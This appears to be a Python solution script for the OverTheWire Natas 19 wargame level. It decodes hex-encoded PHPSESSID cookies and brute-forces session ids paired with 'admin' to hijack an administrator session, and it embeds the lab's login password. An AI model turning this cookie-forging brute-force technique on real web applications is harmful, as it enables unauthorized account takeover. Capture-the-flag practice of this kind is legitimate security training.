import requests
import bs4
import re


# configuration for natas19
USERNAME = 'natas19'
PASSWORD = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
URL = 'http://natas19.natas.labs.overthewire.org/'
AUTH = requests.auth.HTTPBasicAuth(USERNAME, PASSWORD)


session = requests.Session()
session.auth = AUTH
# get the challenge content
response = session.get(URL)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')


# as the webpage said, the code used is the same as the previous level
# however, the session ids are not sequential
# let's see what this means
data = {
    'username' : 'randomusername',
    'password' : 'randompassword',
    'submit' : 'submit'
}
response = session.post(URL, data=data)
# example id: PHPSESSID=3433302d72616e646f6d757365726e616d65
print(f'{response.cookies}\n')


# get the value of PHPSESSID cookie
cookies_dict = session.cookies.get_dict()
phpsessid = cookies_dict['PHPSESSID']
# it seems that the cookie is hex encoded
decoded = bytearray.fromhex(phpsessid).decode()
print(f"""
Encoded:
{phpsessid}
Decoded:
{decoded}
""")


# after running the script a few times,
# we can find the following pattern: <id>-<username>
# for example, 109-randomusername and 292-randomusername
# therefore, we can try to bruteforce the id and use 'admin' as the username
# then, hex encode it
MIN = 1
# assuming that we are still using the same max id
MAX = 640
data = {
    'username' : 'admin',
    'password' : 'randompassword',
    'submit' : 'submit'
}
admin_page = None
for i in range(MIN, MAX+1):
    cookie_str = f'{i}-admin'
    cookie_enc = bytearray(cookie_str, 'utf-8').hex()
    print(f'Current PHPSESSID value: {cookie_str}', end='\r')

    requests.utils.add_dict_to_cookiejar(session.cookies, { 'PHPSESSID' : cookie_enc })
    response = session.post(URL, data=data)
    if re.search(r'You are an admin.', response.text):
        print(response.text)
        admin_page = response.text
        break
